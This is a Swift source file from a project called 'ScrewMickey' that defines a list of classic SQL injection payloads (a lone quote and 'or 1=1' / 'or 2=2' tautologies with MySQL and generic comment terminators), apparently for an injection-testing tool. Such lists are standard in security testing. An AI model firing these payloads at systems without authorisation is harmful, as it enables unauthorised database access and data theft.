//
//  SQLi.swift
//  ScrewMickey
//
//  Created by clement rabourdin on 12/01/2016.
//  Copyright © 2016 Syluaq DP Team. All rights reserved.
//

import Foundation

public var theSQLList = SQLi()

public struct SQLi {
    public enum DBType {
        case Any
        case MySQL
        case Others
    }
    
    public struct SingleSQLi {
        var typeDB : DBType
        var value : String
        
        init(type: DBType, val: String) {
            typeDB = type
            value = val
        }
    }
    
    public let listOfSQLi : [SingleSQLi] = [
        SingleSQLi(type: .Any, val: "'"),
        SingleSQLi(type: .Any, val: " or 1=1 "),
        SingleSQLi(type: .Others, val: " or 1=1 --"),
        SingleSQLi(type: .MySQL, val: " or 1=1 #"),
        SingleSQLi(type: .Any, val: "' or 1=1 "),
        SingleSQLi(type: .Others, val: "' or 1=1 --"),
        SingleSQLi(type: .MySQL, val: "' or 1=1 #"),
        SingleSQLi(type: .Any, val: " or 2=2 "),
        SingleSQLi(type: .Others, val: " or 2=2 --"),
        SingleSQLi(type: .MySQL, val: " or 2=2 #"),
        SingleSQLi(type: .Any, val: "' or 2=2 "),
        SingleSQLi(type: .Others, val: "' or 2=2 --"),
        SingleSQLi(type: .MySQL, val: "' or 2=2 #")
    ]
    
}